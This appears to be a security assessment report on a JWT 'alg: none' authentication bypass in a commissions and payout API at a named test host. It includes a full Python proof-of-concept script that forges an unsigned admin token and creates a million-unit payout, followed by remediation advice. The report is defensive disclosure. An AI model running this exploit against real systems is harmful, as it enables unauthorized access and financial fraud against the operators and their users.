# Critical JWT Algorithm Confusion Enables Complete System Compromise and Unauthorized Payouts

**ID:** vuln-0037
**Severity:** CRITICAL
**Found:** 2026-02-26 19:15:51 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/Payout/CreatePayout
**Method:** POST
**CVE:** CVE-2015-9235
**CWE:** CWE-347
**CVSS:** 10.0

## Description

A critical security vulnerability was discovered in the JWT authentication implementation that allows attackers to completely bypass authentication and gain unauthorized access to administrative functionality, including payout processing.

The application accepts unsigned JWT tokens with the "alg": "none" header, which enables attackers to create valid tokens without proper cryptographic signatures. This vulnerability allows complete privilege escalation to ROLE_ADMIN level access, enabling unauthorized access to all administrative functionality including commission management and payout processing.

The vulnerability exists due to improper validation of JWT token signatures and acceptance of the "none" algorithm, which is a well-known security flaw in JWT implementations (CVE-2015-9235).

## Impact

Successful exploitation of this vulnerability allows attackers to:

1. **Complete System Compromise**: Gain full administrative access to the commission management system
2. **Financial Fraud**: Create unauthorized payouts and manipulate commission structures
3. **Unauthorized Data Access**: Access sensitive financial data and user information
4. **Privilege Escalation**: Escalate privileges from any user level to ROLE_ADMIN
5. **Business Process Compromise**: Bypass all authentication and authorization controls

The financial impact could be severe, potentially resulting in:
- Unauthorized payouts of any amount
- Manipulation of commission structures
- Complete compromise of financial processing
- Regulatory compliance violations
- Significant monetary losses

## Technical Analysis

The vulnerability exists due to improper JWT implementation:

1. **Algorithm Confusion**: The application accepts JWT tokens with "alg": "none" header
2. **Signature Validation Bypass**: No cryptographic signature validation is performed when "alg": "none" is specified
3. **Privilege Escalation**: Attackers can inject ROLE_ADMIN claims into unsigned tokens
4. **Authentication Bypass**: The application trusts the claims in unsigned tokens without validation

The JWT processing code fails to properly validate token signatures and accepts the "none" algorithm, which is explicitly prohibited by JWT security best practices. This allows attackers to create valid tokens with arbitrary claims, including administrative privileges.

## Proof of Concept

**Reproduction Steps:**

1. Create an unsigned JWT token with "alg": "none" header
2. Inject ROLE_ADMIN claims into the token payload
3. Use the unsigned token to authenticate to the application
4. Access administrative endpoints including payout processing
5. Create unauthorized payouts or manipulate commission structures

**Example Token Structure:**
```
Header: {"alg": "none", "typ": "JWT"}
Payload: {
  "sub": "attacker@example.com",
  "roles": ["ROLE_ADMIN"],
  "iat": 1735689600,
  "exp": 1767225600
}
Signature: (empty)
```

```
import requests
import json
import base64
import urllib.parse

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
AUTH_ENDPOINT = f"{BASE_URL}/api/authenticate"
PAYOUT_ENDPOINT = f"{BASE_URL}/api/Payout/CreatePayout"

# Step 1: Create unsigned JWT token with ROLE_ADMIN claims
def create_unsigned_jwt():
    # JWT Header with "alg": "none"
    header = {
        "alg": "none",
        "typ": "JWT"
    }

    # JWT Payload with ROLE_ADMIN claims
    payload = {
        "sub": "attacker@example.com",
        "roles": ["ROLE_ADMIN"],
        "iat": 1735689600,  # Jan 1, 2025
        "exp": 1767225600   # Jan 1, 2026
    }

    # Base64 encode header and payload
    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")

    # Create unsigned JWT (no signature)
    unsigned_jwt = f"{encoded_header}.{encoded_payload}."

    return unsigned_jwt

# Step 2: Use unsigned JWT to access protected endpoints
def exploit_jwt_vulnerability():
    # Create the malicious unsigned JWT
    malicious_token = create_unsigned_jwt()
    print(f"Created unsigned JWT: {malicious_token}")

    # Set up headers with the malicious token
    headers = {
        "Authorization": f"Bearer {malicious_token}",
        "Content-Type": "application/json"
    }

    # Step 3: Test access to protected endpoint
    test_response = requests.get(f"{BASE_URL}/api/account", headers=headers)

    if test_response.status_code == 200:
        print("SUCCESS: Unsigned JWT token accepted by the application")
        print(f"Response: {test_response.json()}")

        # Step 4: Demonstrate financial impact - create unauthorized payout
        payout_payload = {
            "payoutAmount": 1000000,
            "payoutDate": "2024-12-31",
            "commissionRunId": "exploit-run-123",
            "orgId": "current_org_id",
            "clientId": None,
            "status": "Completed"
        }

        payout_response = requests.post(PAYOUT_ENDPOINT, headers=headers, json=payout_payload)

        if payout_response.status_code == 200:
            print("\nCRITICAL IMPACT: Successfully created unauthorized payout")
            print(f"Payout ID: {payout_response.json().get('id')}")
            print(f"Payout Amount: {payout_response.json().get('payoutAmount')}")
            print("\nThis demonstrates complete compromise of the financial processing system")
        else:
            print(f"\nPayout creation failed: {payout_response.status_code} - {payout_response.text}")
    else:
        print(f"FAILED: {test_response.status_code} - {test_response.text}")

if __name__ == "__main__":
    exploit_jwt_vulnerability()
```

## Remediation

**Immediate Remediation Steps:**

1. **Disable "none" Algorithm**: Explicitly reject JWT tokens with "alg": "none" header
2. **Implement Proper Signature Validation**: Validate cryptographic signatures for all JWT tokens
3. **Use Secure JWT Libraries**: Replace custom JWT implementation with well-tested libraries
4. **Implement Algorithm Whitelisting**: Only accept secure algorithms (e.g., HS256, RS256)
5. **Add Token Validation**: Validate all token claims including issuer, audience, and expiration

**Short-Term Actions:**
1. Rotate all JWT signing keys immediately
2. Implement token revocation mechanism
3. Add rate limiting for authentication attempts
4. Implement logging and monitoring for JWT authentication events

**Long-Term Recommendations:**
1. Conduct a comprehensive security review of the authentication system
2. Implement multi-factor authentication for administrative access
3. Conduct regular security testing of JWT implementation
4. Implement financial controls to detect and prevent unauthorized payouts
5. Conduct security awareness training for developers on JWT security best practices

